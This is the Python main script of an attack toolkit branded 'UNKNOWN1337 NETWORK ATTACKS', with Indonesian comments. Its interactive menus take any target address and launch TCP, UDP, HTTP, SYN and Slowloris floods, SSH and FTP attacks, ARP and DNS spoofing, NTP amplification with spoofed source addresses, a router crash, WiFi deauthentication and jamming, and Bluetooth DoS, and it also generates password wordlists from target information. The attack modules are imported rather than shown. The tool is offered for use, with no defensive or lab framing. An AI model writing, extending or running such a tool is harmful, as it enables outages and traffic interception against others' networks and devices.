import logging
import sys
import concurrent.futures
import time
import os
import asyncio

# Import modul serangan
from modules import (tcp_flood, udp_flood, http_flood, slowloris, syn_flood, rapid_ddos,
                     ssh_kill, ftp_flood, arp_spoof, deauth_attack, dns_spoof, ntp_amp,
                     wifi_jammer, bluetooth_dos, router_crash)
# Import modul utilitas
from utils import spoofing, proxy, adaptive, amplification, wordlist_generator, logger, scanner

# Import library untuk banner dan warna
from pyfiglet import Figlet
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

# Konfigurasi logging
logger.setup_logger()
log = logging.getLogger(__name__)


def print_menu(menu_items, title="Main Menu"):
    """Menampilkan menu dengan opsi bernomor."""
  
    print(Fore.CYAN + Style.BRIGHT + f"==== {title} ====\n")  # Judul berwarna
    for i, item in enumerate(menu_items):
        print(Fore.GREEN + f"  [{i+1}] {item}")  # Opsi berwarna
    print(Fore.YELLOW + Style.BRIGHT + "\n  [0] Exit")  # Opsi Exit berwarna
    print(Fore.WHITE + "=" * 30)  # Garis pemisah

def get_choice(max_choice, prompt="Enter your choice: "):
    """Meminta input pilihan dari pengguna dan memvalidasinya."""
    while True:
        try:
            choice = int(input(Fore.WHITE + prompt))  
            if 0 <= choice <= max_choice:
                return choice
            else:
                print(Fore.RED + "Invalid choice. Please try again.")  # Pesan error berwarna
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a number.")  # Pesan error berwarna

def get_input(prompt, required=True, type_cast=str, default=None):
    """Meminta input dari pengguna dengan validasi."""
    while True:
        value = input(Fore.WHITE + f"{prompt} ({'required' if required else 'optional'}, default: {default}): ")
        if not value and not required:
            return default
        elif not value and required:
            print(Fore.RED + "This field is required.")
        else:
            try:
                return type_cast(value)
            except ValueError:
                print(Fore.RED + f"Invalid input.  Please enter a valid {type_cast.__name__}.")

def show_banner():
    """Menampilkan banner ASCII art."""
    f = Figlet(font='slant')  # Pilih font ASCII art (slant, standard, banner3, big, digital, dll.)
    banner_text = f.renderText('UNKNOWN1337')
    print(Fore.RED + Style.BRIGHT + banner_text)
    print(Fore.YELLOW + "       NETWORK ATTACKS\n")  # Judul utama
    print(Fore.CYAN + "       By Adit1337\n")  # Deskripsi

def ddos_menu(target):
    """Sub-menu untuk serangan DDoS."""
    menu_items = [
        "TCP Flood",
        "UDP Flood",
        "HTTP Flood",
        "Slowloris",
        "SYN Flood",
        "Rapid DDoS (Combined)",
        "Back to Main Menu"
    ]
    print_menu(menu_items, title="DDoS Attacks")  # Judul
    choice = get_choice(len(menu_items))

    if choice == 0:
        sys.exit(0)
    elif choice == 7:
        return

    port = get_input("Enter target port", required=False, type_cast=int, default=80)
    duration = get_input("Enter attack duration (seconds)", required=False, type_cast=int, default=60)
    threads = get_input("Enter number of threads", required=False, type_cast=int, default=4)
    threads = max(1, min(threads, 100)) #Limit
    spoof_ip = input(Fore.WHITE + "Enable IP spoofing? (y/n, default: n): ").lower() == 'y'

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        if choice == 1: 
            flood_type = input(Fore.WHITE + "Enter TCP flood type (SYN, ACK, RST, PSH, FIN, URG, default: SYN): ").upper()
            flood_type = flood_type if flood_type in ["SYN", "ACK", "RST", "PSH", "FIN", "URG"] else "SYN"
            for _ in range(threads):
                executor.submit(tcp_flood.attack, target, port, duration, flood_type, spoof_ip)

        elif choice == 2:  
            data_size = get_input("Enter UDP packet size (bytes)", required=False, type_cast=int, default=1024)
            fragment = input(Fore.WHITE + "Enable IP fragmentation? (y/n, default: n): ").lower() == 'y'
            for _ in range(threads):
                executor.submit(udp_flood.attack, target, port, duration, data_size, spoof_ip, fragment)

        elif choice == 3:  
            method = input(Fore.WHITE + "Enter HTTP method (GET, POST, HEAD, etc., default: GET): ").upper()
            method = method if method in ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"] else "GET"
            path = get_input("Enter URL path", required=False, default="/")
            proxy_file = get_input("Enter path to proxy list file (optional)", required=False)
            headers_str = get_input("Enter custom headers (e.g., 'User-Agent: MyBot; X-Custom: Value', optional)", required=False)
            body = get_input("Enter request body (for POST/PUT, optional)", required=False)

            proxies = []
            if proxy_file:
                try:
                    with open(proxy_file, "r") as f:
                        proxies = [line.strip() for line in f]
                except FileNotFoundError:
                    log.error(f"Proxy list file not found: {proxy_file}")
                   

            headers = []
            if headers_str:
                headers = headers_str.split(";") 

            for _ in range(threads):
                executor.submit(http_flood.attack, target, port, duration, method, path, proxies, headers, body)

        elif choice == 4: 
            connections = get_input("Enter number of connections", required=False, type_cast=int, default=200)
            executor.submit(slowloris.attack, target, port, duration, connections)

        elif choice == 5:  # SYN Flood
            for _ in range(threads):
                executor.submit(syn_flood.attack, target, port, duration, spoof_ip)

        elif choice == 6:  # Rapid DDoS
            def combined_attack():
                tcp_flood.attack(target, port, duration // 4, "SYN", spoof_ip)
                udp_flood.attack(target, port, duration // 4, 1024, spoof_ip)
                http_flood.attack(target, port, duration // 4, "GET", "/")
                # syn_flood.attack(target, port, duration // 4, spoof_ip)

            for _ in range(threads):
                executor.submit(combined_attack)

    print(Fore.GREEN + "Attack launched. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "Attack stopped.")


def server_menu(target):
    """Sub-menu untuk serangan server."""
    menu_items = [
        "SSH Kill Attack",
        "FTP Flood",
        "Back to Main Menu"
    ]
    print_menu(menu_items, "Server/Network Attacks")
    choice = get_choice(len(menu_items))

    if choice == 0:
        sys.exit(0)
    elif choice == 3:
        return

    port = get_input("Enter target port (optional, defaults may apply)", required=False, type_cast=int)
    duration = get_input("Enter attack duration (seconds)", required=False, type_cast=int, default=60)
    threads = get_input("Enter number of threads (optional, default 4)", required=False, type_cast=int, default=4)
    threads = max(1, min(threads, 100)) # Limit

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        if choice == 1:
            executor.submit(ssh_kill.attack, target, port if port else 22, duration)
        elif choice == 2:
            username = get_input("Enter FTP username", default="anonymous")
            password = get_input("Enter FTP password", required=False)
            executor.submit(ftp_flood.attack, target, port if port else 21, duration, username, password)

    print(Fore.GREEN + "Attack launched. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "Attack stopped.")


def network_menu(target):
    """Sub-menu untuk serangan jaringan."""
    menu_items = [
        "ARP Spoofing",
        "DNS Spoofing",
        "NTP Amplification",
        "Router Crash",
        "Back to Main Menu"
    ]
    print_menu(menu_items, "Network Attacks")
    choice = get_choice(len(menu_items))

    if choice == 0:
        sys.exit(0)
    elif choice == 5:
        return

    if choice == 1:  # ARP Spoofing
        gateway = get_input("Enter gateway IP address")
        iface = get_input("Enter network interface")
        arp_spoof.attack(target, gateway, iface)

    elif choice == 2:  # DNS Spoofing
        iface = get_input("Enter network interface")
        hosts_file = get_input("Enter path to custom hosts file")
        dns_spoof.attack(iface, hosts_file)

    elif choice == 3:  # NTP Amplification
        reflectors_file = get_input("Enter path to NTP reflectors file")
        duration = get_input("Enter attack duration (seconds)", required=False, type_cast=int, default=60)
        spoof = input(Fore.WHITE + "Enable source IP spoofing? (y/n, default: n): ").lower() == 'y'
        threads = get_input("Enter number of threads", required = False, type_cast=int, default=4)
        threads = max(1,min(threads, 100)) #Limit

        try:
            with open(reflectors_file, "r") as f:
                reflectors = [line.strip() for line in f]
        except FileNotFoundError:
            log.error(f"Reflector file not found: {reflectors_file}")
            return

        if not reflectors:
            log.error("No reflectors found in the file.")
            return

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(ntp_amp.attack, target, reflectors, duration, spoof)
        print(Fore.GREEN + "Attack launched. Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(Fore.RED + "Attack stopped.")


    elif choice == 4:  # Router Crash
        router_crash.attack(target)

def wifi_menu():
    """Sub-menu untuk serangan WiFi."""
    while True:
        wifi_networks = scanner.scan_wifi()
        if not wifi_networks:
            print(Fore.YELLOW + "No WiFi networks found. Please check your WiFi adapter and try again.")
            return

        print(Fore.CYAN + "\nAvailable WiFi Networks:")
        for i, network in enumerate(wifi_networks):
            print(Fore.GREEN + f"  [{i+1}] SSID: {network['ssid']}, BSSID: {network['bssid']}, Channel: {network.get('channel', 'N/A')}")

        target_index = get_choice(len(wifi_networks), prompt="Select a network to target (or 0 to go back): ") - 1
        if target_index < 0:
            return

        target_bssid = wifi_networks[target_index]['bssid']
        target_ssid = wifi_networks[target_index]['ssid']

        wifi_attack_menu = [
            "Deauthentication Attack",
            "WiFi Jammer",
            "Back to Main Menu",
        ]
        print_menu(wifi_attack_menu, title=f"WiFi Attacks (Target: {target_ssid} - {target_bssid})")
        attack_choice = get_choice(len(wifi_attack_menu))

        if attack_choice == 0:
            sys.exit(0)
        elif attack_choice == 3:
            return

        iface = get_input("Enter wireless interface (in monitor mode)")
        duration = get_input("Enter attack duration (seconds)", required=False, type_cast=int, default=60)

        if attack_choice == 1:  # Deauth
            client = get_input("Enter target client MAC (default: FF:FF:FF:FF:FF:FF, broadcast)", required=False, default="FF:FF:FF:FF:FF:FF")
            deauth_attack.attack(target_bssid, client, iface, duration)
        elif attack_choice == 2:  # Wifi Jammer
            wifi_jammer.attack(iface, duration)

def bluetooth_menu():
    """Sub-menu untuk serangan Bluetooth."""
    while True:
        devices =  asyncio.run(scanner.scan_bluetooth())
        if not devices:
            print(Fore.YELLOW + "No Bluetooth devices found.  Make sure Bluetooth is enabled and devices are discoverable.")
            return

        print(Fore.CYAN + "\nDiscovered Bluetooth Devices:")
        for i, (addr, name) in enumerate(devices):
            print(Fore.GREEN + f"  [{i + 1}] {name or 'N/A'} ({addr})")

        target_index = get_choice(len(devices), prompt="Select a device to target (or 0 to go back): ") - 1

        if target_index < 0:
            return

        target_mac = devices[target_index][0]
        target_name = devices[target_index][1]

        bluetooth_attack_menu = [
            "Bluetooth DoS",
            "Back to Main Menu",
        ]
        print_menu(bluetooth_attack_menu, title=f"Bluetooth Attacks (Target: {target_name} - {target_mac})")
        attack_choice = get_choice(len(bluetooth_attack_menu))

        if attack_choice == 0:
            sys.exit(0)
        if attack_choice == 2:
            return

        if attack_choice == 1:  # Bluetooth DoS
            duration = get_input("Enter attack duration (seconds)", required=False, type_cast=int, default=60)
            asyncio.run(bluetooth_dos.attack(target_mac, duration))

def main():
    """Fungsi utama program."""
    while True:
        show_banner()
        menu_items = [
            "Scan WiFi Networks",
            "Scan Bluetooth Devices",
            "DDoS Attacks",
            "Server/Network Attacks",
            "Network Attacks (Advanced)",
            "Generate Wordlist",
            "Exit"
        ]
        print_menu(menu_items)
        choice = get_choice(len(menu_items))

        if choice == 0:
            sys.exit(0)
        elif choice == 1:
            wifi_menu()  # Panggil wifi_menu()
        elif choice == 2:
            bluetooth_menu() # Panggil bluetooth_menu()
        elif choice == 3:
            target = get_input("Enter target IP address or hostname")
            ddos_menu(target)
        elif choice == 4:
            target = get_input("Enter target IP address or hostname")
            server_menu(target)
        elif choice == 5:
            target = get_input("Enter target IP address or hostname/MAC (as needed)")
            network_menu(target)
        elif choice == 6:
            target_info = get_input("Enter target information for wordlist generation (optional)", required=False)
            output_file = get_input("Enter output file name", default="wordlist.txt")
            wordlist = wordlist_generator.generate_wordlist(target_info)
            if wordlist:
                try:
                    with open(output_file, "w") as f:
                        for word in wordlist:
                            f.write(word + "\n")
                    print(f"Wordlist generated and saved to {output_file}")
                except Exception as e:
                    log.error(f"Error writing wordlist to file: {e}")
            else:
                print("Wordlist generation failed.")
        elif choice == 7:
            sys.exit(0)

if __name__ == "__main__":
    main()